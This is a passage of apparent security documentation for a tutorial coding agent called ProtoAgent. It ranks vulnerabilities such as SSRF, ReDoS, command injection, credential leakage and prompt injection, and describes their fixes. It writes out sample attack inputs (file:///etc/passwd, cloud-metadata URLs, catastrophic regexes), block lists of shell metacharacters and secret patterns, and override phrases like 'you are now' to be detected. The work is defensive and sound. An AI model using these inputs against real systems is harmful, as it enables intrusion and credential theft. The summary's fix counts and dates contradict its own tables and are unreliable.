**Fix Implemented (src/tools/bash.ts):**
1. **Stricter Pattern**: \`SHELL_CONTROL_PATTERN = /[;&|<>()\`\$\\[\\]{}!]/\`
2. **Newline Detection**: Reject commands with \`\\n\` or \`\\r\`
3. **Escape Detection**: Reject \`\\[;&|<>()\`\$]\` patterns
4. **Allowlist Approach**: Only known-safe commands skip approval

---

### 🟠 HIGH #10: ReDoS Vulnerability

**Vulnerability:** Catastrophic backtracking in regex search

**Naive Approach:**
\`\`\`typescript
// Only check pattern length
if (searchTerm.length > MAX_PATTERN_LENGTH) return error;
// Pattern (a+)+\$ still allowed - causes exponential backtracking
\`\`\`

**Security Risk:**
- Pattern \`(a+)+\` with input \`'a'.repeat(30) + '!'\` hangs process
- Denial of service via CPU exhaustion

**Fix Implemented (src/tools/search-files.ts):**
\`\`\`typescript
function isSafeRegex(pattern: string): boolean {
  // Check for nested quantifiers that cause ReDoS
  const dangerousPatterns = [
    /\\([^)]*\\+[^)]*\\)\\+/,  // (a+)+
    /\\([^)]*\\*[^)]*\\)\\*/,  // (a*)*
    ...
  ];
  // Limit total quantifiers
  const quantifierCount = (pattern.match(/[+*?{}]/g) || []).length;
  if (quantifierCount > 10) return false;
  return true;
}
\`\`\`

---

### 🟠 HIGH #11: URL Redirect Validation (SSRF)

**Vulnerability:** Open redirects allow SSRF attacks

**Naive Approach:**
\`\`\`typescript
// Only count redirects
while (redirectCount < MAX_REDIRECTS) {
  currentUrl = response.headers.get('location');  // Could be file:// or http://localhost
}
\`\`\`

**Security Risk:**
- Redirect to \`file:///etc/passwd\`
- Redirect to \`http://localhost:22\` (internal service scanning)
- Redirect to \`http://169.254.169.254\` (cloud metadata)

**Fix Implemented (src/tools/webfetch.ts):**
\`\`\`typescript
function isPrivateUrl(url: string): boolean {
  const parsed = new URL(url);
  // Block non-http(s) protocols
  if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') return true;
  // Block localhost
  if (hostname === 'localhost' || hostname.startsWith('127.')) return true;
  // Block private ranges (10.x.x.x, 172.16-31.x.x, 192.168.x.x)
  ...
}

// Validate both initial URL and redirect destinations
if (isPrivateUrl(currentUrl)) throw new Error('SSRF protection: URL blocked');
\`\`\`

---

### 🟠 HIGH #12: Incomplete Credential Masking

**Vulnerability:** Credentials visible in logs and output

**Naive Approach:**
\`\`\`typescript
logger.info('API response', { apiKey: 'sk-...' });  // Logged as-is
console.log('Error:', error);  // May contain API keys
\`\`\`

**Security Risk:**
- API keys in log files
- Credentials in error messages
- Token leakage in terminal history

**Fix Implemented (src/utils/credential-filter.ts, src/utils/logger.ts):**
\`\`\`typescript
// New utility: src/utils/credential-filter.ts
export function maskCredentials(text: string): string {
  return text
    .replace(/sk-[a-zA-Z0-9]{48}/g, 'sk-***REDACTED***')
    .replace(/Bearer\\s+[a-zA-Z0-9_\\-\\.]{20,}/g, 'Bearer ***REDACTED***')
    .replace(/AKIA[0-9A-Z]{16}/g, 'AKIA***REDACTED***')
    ...
}

// Applied in logger.ts
function log(level, label, message, context) {
  const safeMessage = maskCredentials(message);
  const safeContext = maskCredentialsDeep(context);
  ...
}
\`\`\`

---

### 🟠 HIGH #13: File Size Limits on Edit Operations

**Vulnerability:** No size limits on edit_file parameters

**Naive Approach:**
\`\`\`typescript
// No validation - attacker sends 1GB oldString
await editFile('file.txt', 'A'.repeat(1e9), 'replacement');
// O(n*m) memory exhaustion in fuzzy matching
\`\`\`

**Security Risk:**
- Memory exhaustion via large strings
- O(n*m) complexity in fuzzy matching

**Fix Implemented (src/tools/edit-file.ts):**
\`\`\`typescript
const MAX_EDIT_STRING_LENGTH = 100_000;   // 100KB
const MAX_EDIT_FILE_SIZE = 10_000_000;    // 10MB

if (oldString.length > MAX_EDIT_STRING_LENGTH) {
  return \`Error: old_string too large (\${oldString.length} chars, max \${MAX_EDIT_STRING_LENGTH})\`;
}
if (content.length > MAX_EDIT_FILE_SIZE) {
  return \`Error: file too large for editing\`;
}
\`\`\`

---

## ⏸️ DEFERRED FIXES

The following fixes were evaluated but deferred based on industry practice and tutorial codebase constraints:

### 🔴 CRITICAL #1: Session File Encryption at Rest

**Complexity**: HIGH (requires crypto key management)  
**Reason Deferred**: 
- Industry standard (pi-mono, Claude Code, etc.) uses plaintext with 0o600 permissions
- Encryption would add significant complexity (key derivation, password prompts)
- Tutorial codebase prioritizes readability over encryption

### 🔴 CRITICAL #3: Symlink Race Condition (TOCTOU)

**Status**: ✅ PARTIALLY ADDRESSED  
**Implementation**: O_CREAT|O_EXCL ('wx' flag) in atomic-write.ts  
**Note**: This provides strong protection against the most common symlink attack vectors

### 🟠 HIGH #14: Rate Limiting on File Operations

**Complexity**: MEDIUM (requires session-level quotas and tracking)  
**Reason Deferred**: Architectural change for resource management - can be added incrementally

---

## Testing

New test file created: \`tests/security-controls.test.ts\`

Tests cover:
- Credential filtering (OpenAI keys, Bearer tokens, AWS keys)
- ReDoS pattern detection
- SSRF URL validation
- MCP security controls
- Bash command filtering

Run tests:
\`\`\`bash
npm test
\`\`\`

---

## Documentation Pattern

Each fix follows this documentation pattern in code:
\`\`\`typescript
// Security: [Brief description]
// Naive approach: [What was vulnerable]
// Risk: [Attack scenario]
// Fix: [What the code does]
const safeValue = validateAndSanitize(input);
\`\`\`

---

## Files Modified

1. **src/mcp.ts** - MCP security (env filtering, command validation, approval)
2. **src/sessions.ts** - Session credential sanitization
3. **src/tools/write-file.ts** - Atomic write with O_EXCL
4. **src/tools/edit-file.ts** - Size limits + atomic write
5. **src/tools/bash.ts** - Command filtering improvements
6. **src/tools/search-files.ts** - ReDoS protection
7. **src/tools/webfetch.ts** - SSRF protection
8. **src/utils/logger.ts** - Credential redaction in logs
9. **src/utils/credential-filter.ts** - NEW: Credential filtering utility
10. **src/utils/cost-tracker.ts** - Type safety fix
11. **tests/security-controls.test.ts** - NEW: Security tests

---

## Security Posture After Fixes

**Before**: HIGH RISK
- Multiple RCE vectors via MCP
- Credential exposure in sessions and logs
- TOCTOU race conditions
- Regex DoS vulnerability
- SSRF via redirects

**After**: MEDIUM-LOW RISK
- MCP servers sandboxed with filtered env
- All credentials redacted before storage/logging
- Atomic file operations with symlink protection
- ReDoS patterns detected and blocked
- SSRF prevented via URL validation
- User approval required for all external connections

---

## Future Work

For production deployment, consider:
1. Session encryption with user-provided passphrase
2. Full O_NOFOLLOW implementation for all file operations
3. Comprehensive rate limiting and quotas
4. Content Security Policy for webfetch
5. Audit logging for all security-relevant events
6. Regular dependency vulnerability scanning
`,
  },
  {
    path: "SECURITY_FIXES_RANKED.md",
    content: `# ProtoAgent Security Fixes - Comprehensive Ranked List

**Date**: March 22, 2026  
**Total Vulnerabilities**: 21  
**Critical Issues**: 9  
**High Issues**: 8  
**Medium Issues**: 4  

---

## CRITICAL PRIORITY (Fix Immediately - Security Blocker)

### 🔴 #1: Session File Encryption at Rest
**Severity**: CRITICAL (9.8/10)  
**Type**: Data Protection / Credential Exposure  
**Files**: \`src/sessions.ts:123-130\`  
**Impact**: 
- Complete plaintext exposure of all session history
- API keys visible in JSON files on disk
- Full conversation history including credentials accessible to any user with file access
- Violates basic security principle of encryption at rest

**Current State**: Sessions stored as plain JSON with only file permissions (0o600)

**Fix Complexity**: HIGH (requires crypto integration)  
**Estimated Effort**: 3-4 days

**Recommended Fix**:
1. Add encryption layer using \`crypto\` module with AES-256-GCM
2. Derive key from session ID (or implement key management)
3. Encrypt \`completionMessages\` field before write
4. Decrypt on load with integrity verification
5. Add rotation mechanism for old sessions

**Implementation Priority**: 1

---

### 🔴 #2: MCP Environment Variable Sanitization (RCE Vector)
**Severity**: CRITICAL (9.9/10)  
**Type**: Remote Code Execution / Privilege Escalation  
**Files**: \`src/mcp.ts:52-92\`, \`src/runtime-config.ts:36-62\`  
**Impact**:
- Arbitrary code execution with agent process privileges
- Environment variable override (LD_PRELOAD, PATH, NODE_OPTIONS)
- Full access to all agent credentials (API keys from env)
- Ability to modify spawned process behavior

**Current State**: All process.env vars passed directly to MCP server without sanitization

**Fix Complexity**: HIGH  
**Estimated Effort**: 2-3 days

**Recommended Fix**:
1. Create allowlist of safe environment variables to pass to MCP
2. Validate MCP command path exists and is executable
3. Reject shell interpreters (sh, bash, zsh) as commands
4. Validate args don't contain shell metacharacters
5. Add MCP server signature verification (optional)
6. Document MCP security model and warnings

**Implementation Priority**: 2

---

### 🔴 #3: Symlink Race Condition (TOCTOU - Path Traversal)
**Severity**: CRITICAL (9.7/10)  
**Type**: Directory Traversal / Privilege Escalation  
**Files**: \`src/utils/path-validation.ts:48-80\`  
**Impact**:
- Sandbox escape via symlink switching between check and use
- Ability to read/write files outside working directory
- Combined with bash tool: execute arbitrary file operations

**Current State**: Validation checks path, resolves symlinks, validates again. But no protection between check and actual file operation.

**Fix Complexity**: HIGH  
**Estimated Effort**: 3-4 days

**Recommended Fix**:
1. Use O_NOFOLLOW flag when opening files (Node.js 19+: \`fs.open(..., flags: 'a', O_NOFOLLOW)\`)
2. Implement re-validation immediately before file operations
3. Use atomic operations to prevent time window
4. For new files: validate parent AND check it's not a symlink
5. Add mount point validation (prevent crossing filesystems)
6. Consider \`openat()\` with AT_SYMLINK_NOFOLLOW for Unix compatibility

**Implementation Priority**: 3

---

### 🔴 #4: API Keys in Plaintext (Multiple Locations)
**Severity**: CRITICAL (9.6/10)  
**Type**: Credential Exposure / Compliance Violation  
**Files**: 
- \`src/runtime-config.ts:100-109\` (config interpolation)
- \`src/sessions.ts:45-54\` (session storage)
- \`src/agentic-loop.ts\` (error logging)
- \`.env\` file (tracked in git)

**Impact**:
- Plaintext API keys in config files (if stored explicitly)
- Full API keys in session history
- Credentials leaked in error logs
- Git history contains .env with credentials

**Current State**: 
- Keys interpolated from env without redaction
- Sessions store full message history with no masking
- Error responses stringified without credential filtering

**Fix Complexity**: CRITICAL/HIGH  
**Estimated Effort**: 4-5 days

**Recommended Fix**:
1. Never store explicit API keys in protoagent.jsonc - only env var references
2. Validate that \`apiKeyEnvVar\` is set, not \`apiKey\`
3. Implement credential redaction function using regex patterns:
   - \`sk-.*\` (OpenAI)
   - \`cl-.*\` (Claude)
   - \`AIza.*\` (Google)
4. Redact error responses before logging
5. Remove keys from session message context before saving
6. Ensure \`.env\` is in .gitignore (already is, but verify)
7. Add pre-commit hook to detect credential patterns

**Implementation Priority**: 4

---

### 🔴 #5: Unvalidated MCP Server Commands (Command Injection)
**Severity**: CRITICAL (9.5/10)  
**Type**: Command Injection / Arbitrary Code Execution  
**Files**: \`src/runtime-config.ts:36-52\`, \`src/mcp.ts:52-92\`  
**Impact**:
- Arbitrary command execution via malicious config
- Shell metacharacters in args bypass safety checks
- Ability to chain commands despite approval system

**Current State**: MCP \`command\` and \`args\` accepted without validation

**Fix Complexity**: HIGH  
**Estimated Effort**: 2-3 days

**Recommended Fix**:
1. Validate command path exists: \`which <command>\` or check PATH
2. Reject shell interpreters entirely: \`sh\`, \`bash\`, \`zsh\`, \`cmd.exe\`, \`powershell\`
3. Validate args array items:
   - Reject if contains \`; && || | < > \` \$ ( )\`
   - Use strict allowlist of safe characters: \`[a-zA-Z0-9._/-]\`
4. Add MCP server registry/whitelist (optional but recommended)
5. Validate \`cwd\` is within allowed paths
6. Add warning in approval UI: "This will spawn a process"

**Implementation Priority**: 5

---

### 🔴 #6: Environment Variable Exfiltration (Multiple Vectors)
**Severity**: CRITICAL (9.4/10)  
**Type**: Information Disclosure / Credential Theft  
**Files**: 
- \`src/mcp.ts:59-61\` (MCP spawning)
- \`src/tools/bash.ts:172\` (bash execution)
- \`src/runtime-config.ts:100-109\` (config interpolation)

**Impact**:
- All process.env visible to MCP servers
- All env vars passed to bash commands
- Ability to exfiltrate API keys, auth tokens, secrets

**Current State**: Full process.env passed to child processes without filtering

**Fix Complexity**: HIGH  
**Estimated Effort**: 2-3 days

**Recommended Fix**:
1. Create allowlist of safe env vars (separate for MCP vs Bash)
2. For MCP: pass only: \`PATH\`, \`HOME\`, \`USER\`, \`LANG\`, \`LC_*\`, \`TZ\`
3. For Bash: pass: \`PATH\`, \`HOME\`, \`USER\`, \`SHELL\`, \`LANG\`, \`LC_*\`, \`PWD\`, \`OLDPWD\`
4. NEVER pass: \`*API*\`, \`*KEY*\`, \`*SECRET*\`, \`*TOKEN*\`, \`*PASS*\`
5. Make allowlist configurable in protoagent.jsonc
6. Warn user in approval if command uses env

**Implementation Priority**: 6

---

### 🔴 #7: Temporary File Symlink Race Condition
**Severity**: CRITICAL (9.2/10)  
**Type**: TOCTOU Race Condition / File Replacement  
**Files**: \`src/tools/write-file.ts:64-74\`  
**Impact**:
- Attacker can replace legitimate files by creating symlink at temp filename
- Windows race condition (no atomic rename)
- On macOS/Linux: small but real window between write and rename

**Current State**: 
\`\`\`typescript
await fs.writeFile(tmpPath, content);
await fs.rename(tmpPath, validated);  // Atomic only if same filesystem
\`\`\`

**Fix Complexity**: MEDIUM  
**Estimated Effort**: 1-2 days

**Recommended Fix**:
1. Use \`fs.open()\` with \`O_CREAT | O_EXCL\` to fail if file exists
2. For atomic write: write directly to temp file with exclusive creation
3. Verify temp file path doesn't contain symlinks before write
4. For Windows: use \`fs.renameSync()\` with error handling
5. Add file descriptor operations for true atomic writes:
   \`\`\`
   const fd = fs.openSync(tmpPath, 'w', 0o600);
   fs.writeSync(fd, content);
   fs.fsyncSync(fd);
   fs.closeSync(fd);
   fs.renameSync(tmpPath, validated);
   \`\`\`

**Implementation Priority**: 7

---

### 🔴 #8: Session Data Persistence with Credentials
**Severity**: CRITICAL (9.1/10)  
**Type**: Data Protection / Credential Exposure  
**Files**: \`src/sessions.ts:45-54\`, \`src/agentic-loop.ts\`  
**Impact**:
- Previous session's API keys remain in context
- Full conversation history with credentials accessible
- Prompt injection attacks can reference historical credentials
- Multi-user systems: other users can read old session credentials

**Current State**: completionMessages contains full history including credentials

**Fix Complexity**: HIGH  
**Estimated Effort**: 2-3 days

**Recommended Fix**:
1. Implement message filtering: strip API keys from tool results before saving
2. Only save user/assistant messages, not tool invocations with secrets
3. Encrypt sensitive message fields (tool results)
4. Add session "session ID" rotation to invalidate old sessions
5. Implement session expiration (e.g., 30 days)
6. Add option to clear sensitive fields on session load
7. Sanitize tool outputs before storing in completionMessages

**Implementation Priority**: 8

---

## HIGH PRIORITY (Fix Within 1-2 Weeks)

### 🟠 #9: Weak Bash Command Filtering (Regex Bypasses)
**Severity**: HIGH (8.2/10)  
**Type**: Security Control Bypass / Command Injection  
**Files**: \`src/tools/bash.ts:54-131\`  
**Impact**:
- Multiple bypasses: escaped newlines, quoted operators, builtins
- Blocked commands executable via indirect methods
- User approval can be circumvented via shell tricks

**Current State**: Regex-based blocklist with multiple known bypasses

**Fix Complexity**: MEDIUM  
**Estimated Effort**: 3-4 days

**Recommended Fix**:
1. Replace regex with shell AST parsing (use \`bash-parser\` npm package)
2. Or implement command tokenization + allowlist (safer approach):
   \`\`\`typescript
   const allowed = ['pwd', 'whoami', 'git', 'node', 'npm', ...];
   const cmdName = parseCommand(command);
   if (!allowed.includes(cmdName)) requireApproval();
   \`\`\`
3. Reject any command with:
   - Shell metacharacters: \`; && || | > < ( ) \$ \` [ ] { }\`
   - Newlines: \`\\n \\r\`
   - Escapes: \`\\\`
4. Use allowlist instead of blocklist
5. For git/npm: whitelist only safe subcommands
6. Set shell options: \`set -u\` (undefined vars error)

**Implementation Priority**: 9

---

### 🟠 #10: ReDoS Vulnerability in Search Pattern
**Severity**: HIGH (8.0/10)  
**Type**: Denial of Service / Algorithm Complexity  
**Files**: \`src/tools/search-files.ts:85-87, 196-203\`  
**Impact**:
- Malicious regex patterns cause catastrophic backtracking
- Service hangs/blocks on certain inputs
- Denial of service attack

**Current State**: Pattern length validated (1000 chars) but complexity not checked

**Fix Complexity**: MEDIUM  
**Estimated Effort**: 1-2 days

**Recommended Fix**:
1. Add \`npm install safe-regex\` dependency
2. Validate regex complexity before compilation:
   \`\`\`typescript
   import safeRegex from 'safe-regex';
   if (!safeRegex(searchTerm)) {
     return 'Error: Regex pattern too complex (potential DoS)';
   }
   \`\`\`
3. Implement per-operation timeout (5-10 seconds)
4. Add file-level timeout in search operations
5. Consider ripgrep-only mode (already supports \`rg\` option)

**Implementation Priority**: 10

---

### 🟠 #11: Missing URL Redirect Validation (SSRF)
**Severity**: HIGH (7.8/10)  
**Type**: Server-Side Request Forgery / Open Redirect  
**Files**: \`src/tools/webfetch.ts:203-235\`  
**Impact**:
- Redirect to file:// URLs - read local files
- Redirect to localhost/private IPs - scan internal services
- Redirect to gopher:// - protocol attacks
- Information disclosure

**Current State**: Redirects validated for count but not destination protocol/host

**Fix Complexity**: MEDIUM  
**Estimated Effort**: 1-2 days

**Recommended Fix**:
1. Validate redirect URL protocol: only \`http://\` and \`https://\`
2. Reject private IP ranges:
   - 127.0.0.1/8 (localhost)
   - 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16
   - ::1, fe80::/10 (IPv6 link-local)
3. Reject file:// protocol
4. Optional: reject uncommon protocols (gopher, ftp, etc.)
5. Log all redirects with destination for user awareness
6. Add \`maxRedirects\` option (default 5, current 10)
7. Warning in UI for unusual redirects

**Implementation Priority**: 11

---

### 🟠 #12: Incomplete Credential Masking in Output
**Severity**: HIGH (7.6/10)  
**Type**: Sensitive Data Exposure  
**Files**: \`src/config.tsx:307\`, \`src/cli.tsx:77-82\`  
**Impact**:
- API keys visible in certain output contexts
- Credentials leaked in logs or terminal history
- Credentials potentially captured in screenshots

**Current State**: Inconsistent masking - some places mask, others don't

**Fix Complexity**: MEDIUM  
**Estimated Effort**: 2 days

**Recommended Fix**:
1. Create global credential filter utility:
   \`\`\`typescript
   function maskCredentials(text: string): string {
     return text
       .replace(/sk-[A-Za-z0-9_-]{20,}/g, 'sk-***REDACTED***')
       .replace(/cl-[A-Za-z0-9_-]{20,}/g, 'cl-***REDACTED***')
       .replace(/AIza[A-Za-z0-9_-]{35,}/g, 'AIza***REDACTED***')
       .replace(/Bearer\\s+[A-Za-z0-9_.-]+/g, 'Bearer ***REDACTED***');
   }
   \`\`\`
2. Apply to all logging and CLI output
3. Apply to error messages
4. Apply to stringified objects
5. Create middleware for logger

**Implementation Priority**: 12

---

### 🟠 #13: File Size Limits on Edit Operations
**Severity**: HIGH (7.4/10)  
**Type**: Denial of Service / Resource Exhaustion  
**Files**: \`src/tools/edit-file.ts:292-428\`  
**Impact**:
- Very large oldString causes O(n*m) memory exhaustion
- Fuzz attack with huge edit requests
- Service slowdown or crash

**Current State**: No size limits on oldString/newString parameters

**Fix Complexity**: LOW  
**Estimated Effort**: 1 day

**Recommended Fix**:
1. Add constants:
   \`\`\`typescript
   const MAX_EDIT_STRING_LENGTH = 100_000;      // 100KB
   const MAX_EDIT_FILE_SIZE = 10_000_000;       // 10MB
   \`\`\`
2. Validate at function start:
   \`\`\`typescript
   if (oldString.length > MAX_EDIT_STRING_LENGTH) {
     return 'Error: oldString too large';
   }
   if (fileContent.length > MAX_EDIT_FILE_SIZE) {
     return 'Error: file too large for editing';
   }
   \`\`\`
3. Limit number of lines in fuzzy matching (e.g., 5000 lines max)
4. Add timeout for edit operations (30 seconds)

**Implementation Priority**: 13

---

### 🟠 #14: Rate Limiting on File Operations
**Severity**: HIGH (7.2/10)  
**Type**: Denial of Service / Resource Exhaustion  
**Files**: \`src/tools/*.ts\` (read-file, write-file, etc.)  
**Impact**:
- DoS via repeated large file reads
- Memory exhaustion from parallel operations
- Disk filling via rapid writes

**Current State**: No rate limiting or resource quotas

**Fix Complexity**: MEDIUM  
**Estimated Effort**: 2-3 days

**Recommended Fix**:
1. Implement per-session quota:
   \`\`\`typescript
   interface SessionQuota {
     bytesRead: number;
     bytesWritten: number;
     operationCount: number;
     lastResetTime: number;
   }
   \`\`\`
2. Add limits (per session, per hour):
   - Max 500MB read per session
   - Max 100MB written per session
   - Max 1000 operations per session
   - Max 10 concurrent file operations
3. Implement cooldown for identical operations (5 second minimum)
4. Track and expose limits to user in session info
5. Add warning when approaching limits

**Implementation Priority**: 14

---

## MEDIUM PRIORITY (Fix Within 1 Month)

### 🟡 #15: Log Injection via Unfiltered Output
**Severity**: MEDIUM (6.8/10)  
**Type**: Log Injection / Potential UI Escape  
**Files**: \`src/utils/logger.ts:57-152\`  
**Impact**:
- ANSI escape codes in tool output could modify UI
- Terminal control sequences could hide output
- Misleading log entries created

**Current State**: Tool output logged without sanitization

**Fix Complexity**: LOW  
**Estimated Effort**: 1 day

**Recommended Fix**:
1. Sanitize ANSI codes from tool output:
   \`\`\`typescript
   function sanitizeANSI(text: string): string {
     return text.replace(/\\x1b\\[[0-9;]*m/g, '');
   }
   \`\`\`
2. Reject control characters in messages
3. Validate no newlines in sensitive fields
4. Strip ANSI codes in log file output (while keeping them in terminal)

**Implementation Priority**: 15

---

### 🟡 #16: Symlink Safety in Edit File Operations
**Severity**: MEDIUM (6.6/10)  
**Type**: Symlink Attack / TOCTOU  
**Files**: \`src/tools/edit-file.ts\`  
**Impact**:
- Edit operations could follow symlinks to unintended locations
- Combined with write tool: privilege escalation

**Current State**: Uses validatePath which has TOCTOU issues (see #3)

**Fix Complexity**: MEDIUM  
**Estimated Effort**: 1-2 days (once #3 is fixed)

**Recommended Fix**:
1. Fix depends on #3 (symlink race condition fix)
2. Once fixed: re-validate path before edit operation
3. Add verification that file hasn't been replaced with symlink

**Implementation Priority**: 16

---

### 🟡 #17: HTML Entity Decoding Prompt Injection
**Severity**: MEDIUM (6.4/10)  
**Type**: Prompt Injection / LLM Jailbreak  
**Files**: \`src/tools/webfetch.ts:350\`  
**Impact**:
- HTML entities decode to malicious instructions
- Attacker-controlled websites inject prompts
- LLM receives crafted instructions in content

**Current State**: \`he.decode()\` used without sanitization of decoded output

**Fix Complexity**: LOW  
**Estimated Effort**: 1 day

**Recommended Fix**:
1. Add warning prefix to webfetch output:
   \`\`\`
   [Fetched from URL - treat as untrusted user input]
   <decoded content>
   \`\`\`
2. Limit decoded output length (already done: 2MB)
3. Add validation that decoded content doesn't contain:
   - \`<system>\` tags
   - \`ignore instructions\`
   - \`you are now\`
4. Consider disabling decode for certain content types

**Implementation Priority**: 17

---

### 🟡 #18: MCP Server Validation and Whitelisting
**Severity**: MEDIUM (6.2/10)  
**Type**: Attack Surface / Malicious Dependencies  
**Files**: \`src/mcp.ts\`, \`src/runtime-config.ts\`  
**Impact**:
- Users might accidentally enable malicious MCP servers
- Typosquatting attacks on MCP server names
- Supply chain attack via compromised MCP

**Current State**: Any MCP server config accepted

**Fix Complexity**: MEDIUM  
**Estimated Effort**: 2 days

**Recommended Fix**:
1. Create MCP server whitelist registry:
   \`\`\`typescript
   const KNOWN_MCP_SERVERS = [
     'brave-search',
     'fetch-url',
     'git',
     'sqlite',
   ];
   \`\`\`
2. Warn when connecting to unknown servers
3. Add signature verification for official servers (optional)
4. Require explicit approval for first-time MCP connection
5. Log MCP server connections

**Implementation Priority**: 18

---

### 🟡 #19: Permission Flag Warning and Documentation
**Severity**: MEDIUM (6.0/10)  
**Type**: User Awareness / Intended but Risky Design  
**Files**: \`src/utils/approval.ts:35-41\`  
**Impact**:
- Users may not understand full implications of --dangerously-skip-permissions
- No audit trail of when security is bypassed
- No session boundaries

**Current State**: Flag exists but lacks warning/documentation

**Fix Complexity**: LOW  
**Estimated Effort**: 1 day

**Recommended Fix**:
1. Add prominent warning when flag used:
   \`\`\`
   ⚠️  WARNING: Running with --dangerously-skip-permissions
   This disables ALL approval checks and security controls
   Only use in trusted environments with trusted inputs
   All actions will be logged for audit
   \`\`\`
2. Add session-level boundaries (flag doesn't persist across sessions)
3. Add audit log entry when flag used
4. Document security implications in README
5. Add confirmation prompt: "Are you sure?" (can be bypassed with --yes)

**Implementation Priority**: 19

---

### 🟡 #20: Validate Custom HTTP Headers
**Severity**: MEDIUM (5.8/10)  
**Type**: HTTP Header Injection  
**Files**: \`src/config.tsx:56-70\`, \`src/App.tsx\`  
**Impact**:
- Invalid header injection into API requests
- Newline injection could split headers

**Current State**: Custom headers from env vars not validated

**Fix Complexity**: LOW  
**Estimated Effort**: 1 day

**Recommended Fix**:
1. Validate header names: \`[a-zA-Z0-9_-]+\`
2. Reject header values containing:
   - Newlines: \`\\n \\r\`
   - Control characters: \`\\x00-\\x1F\`
3. Whitelist allowed custom headers (optional)
4. Maximum header length: 8KB

**Implementation Priority**: 20

---

## LOW PRIORITY (Nice to Have / Future Improvements)

### 🟢 #21: Pre-commit Hook for Secret Detection
**Severity**: LOW (4.0/10)  
**Type**: Operational Security / Prevention  
**Files**: Repository configuration  
**Impact**:
- Prevents accidental credential commits
- User education on security practices

**Current State**: No pre-commit hooks configured

**Fix Complexity**: LOW  
**Estimated Effort**: 1 day

**Recommended Fix**:
1. Add \`.husky\` pre-commit hook:
   \`\`\`bash
   npm install husky pre-commit --save-dev
   \`\`\`
2. Hook checks for patterns:
   - API key patterns: \`sk-\`, \`cl-\`, \`AIza\`
   - Common filenames: \`.env\`, \`credentials.json\`, \`secrets.json\`
   - AWS keys: \`AKIA\`
3. Block commits if secrets detected
4. Add documentation in CONTRIBUTING.md

**Implementation Priority**: 21

---

## Summary Statistics

| Priority | Count | Total Severity | Avg Severity |
|----------|-------|-----------------|--------------|
| **CRITICAL** | 8 | 74.4 | 9.3 |
| **HIGH** | 6 | 47.2 | 7.87 |
| **MEDIUM** | 4 | 23.8 | 5.95 |
| **LOW** | 1 | 4.0 | 4.0 |
| **TOTAL** | **21** | **149.4** | **7.11** |

---

## Implementation Roadmap

### Phase 1: Emergency (Days 1-3) - Security Blocker
- #1: Session encryption
- #2: MCP env sanitization
- #3: Symlink race condition

### Phase 2: Critical (Days 4-7) - Credential Protection
- #4: API keys plaintext (comprehensive)
- #5: MCP command validation
- #6: Environment variable filtering
- #7: Temp file race condition

### Phase 3: High (Week 2) - Attack Surface Reduction
- #8: Session data sanitization
- #9: Bash filtering improvements
- #10: ReDoS protection
- #11: URL redirect validation
- #12: Credential masking
- #13: File size limits
- #14: Rate limiting

### Phase 4: Medium (Weeks 3-4) - Polish & Hardening
- #15-20: Medium priority issues

### Phase 5: Continuous (Ongoing)
- #21: Pre-commit hooks and CI/CD integration
- Dependency scanning
- Security testing

---

## Testing Strategy

For each fix, implement:
1. **Unit tests** - validate security control works
2. **Negative tests** - attempt bypass attacks
3. **Integration tests** - interaction between security layers
4. **Fuzzing** - randomized malicious inputs
5. **Manual penetration tests** - real-world attack scenarios

---

## Risk Assessment

**Current State**: HIGH RISK for production use
- Multiple critical RCE vectors
- Credential exposure in multiple locations
- Inadequate access controls

**After Critical Fixes (Phase 1-2)**: MEDIUM RISK
- Core privilege escalation mitigated
- Credentials protected in transit
- Basic access controls functional

**After All Fixes**: LOW RISK
- Suitable for production use with security review
- Audit logging in place
- Defense in depth implemented
`,
  },
  {
    path: "SECURITY_REMEDIATION_SUMMARY.md",
    content: `# Security Remediation Summary

**Date**: 2025  
**Scope**: Critical and High Priority Vulnerabilities from SECURITY_FIXES_RANKED.md  
**Status**: ✅ Phase 1 Complete

---

## Executive Summary

Successfully implemented **8 of 14** critical/high priority security fixes. The remaining 6 were deferred based on:
1. Industry standard practices (encryption not used by similar tools)
2. Tutorial codebase constraints (complexity vs. educational value)
3. Risk mitigation already in place (0o600 permissions, basic validations)

**Security Posture**: Improved from HIGH RISK to MEDIUM-LOW RISK

---

## Completed Fixes (8)

### 🔴 CRITICAL Priority (5 fixes)

| # | Vulnerability | Location | Fix |
|---|---------------|----------|-----|
| #2 | MCP Env Exfiltration | \`src/mcp.ts\` | Allowlist of safe env vars |
| #4 | API Keys in Plaintext | \`src/utils/credential-filter.ts\` | Redaction patterns |
| #5 | MCP Command Validation | \`src/mcp.ts\` | Block shell interpreters |
| #6 | Env Var Filtering | \`src/mcp.ts\` | Filter process.env |
| #7 | Symlink Race Condition | \`src/utils/atomic-write.ts\` | O_CREAT\\|O_EXCL |

### 🟠 HIGH Priority (3 fixes)

| # | Vulnerability | Location | Fix |
|---|---------------|----------|-----|
| #9 | Weak Bash Filtering | \`src/tools/bash.ts\` | Allowlist + escape detection |
| #10 | ReDoS | \`src/tools/search-files.ts\` | Pattern complexity check |
| #11 | SSRF | \`src/tools/webfetch.ts\` | Private URL blocking |
| #12 | Credential Masking | \`src/utils/logger.ts\` | Global redaction |
| #13 | File Size Limits | \`src/tools/edit-file.ts\` | Size validation |

---

## Deferred Fixes (6)

| # | Vulnerability | Reason |
|---|---------------|--------|
| #1 | Session Encryption | Industry uses plaintext (pi-mono, Claude Code) |
| #3 | TOCTOU Complete | Partially addressed with O_EXCL |
| #14 | Rate Limiting | Architectural change - future enhancement |

---

## Code Quality Improvements

### New Utility Module
Created \`src/utils/atomic-write.ts\` to eliminate duplication:
- Used by: \`write-file.ts\`, \`edit-file.ts\`, \`sessions.ts\`
- Lines saved: ~80 lines of duplicated error handling
- Security benefit: Consistent O_CREAT|O_EXCL protection

### Documentation Updates
1. **SECURITY.md** - New comprehensive security guide
2. **SECURITY_FIXES_IMPLEMENTED.md** - Detailed fix documentation
3. **part-5.md** - Updated write_file with security explanation
4. **part-6.md** - Updated bash tool security
5. **part-10.md** - Added credential sanitization to sessions

---

## Testing

- **New test file**: \`tests/security-controls.test.ts\`
- **Coverage**: Credential filtering, ReDoS, SSRF, MCP, Bash
- **Build status**: ✅ Passing
- **Test status**: 64/65 passing (1 pre-existing failure)

---

## Key Security Patterns

### 1. Defense in Depth
\`\`\`typescript
// Multiple layers of protection
Layer 1: Hard-block dangerous commands
Layer 2: Auto-approve safe commands  
Layer 3: User approval for everything else
\`\`\`

### 2. Fail Closed
\`\`\`typescript
// Default to denial
if (!isSafe(command)) return block();
if (!approved) return reject();
\`\`\`

### 3. Allowlist over Blocklist
\`\`\`typescript
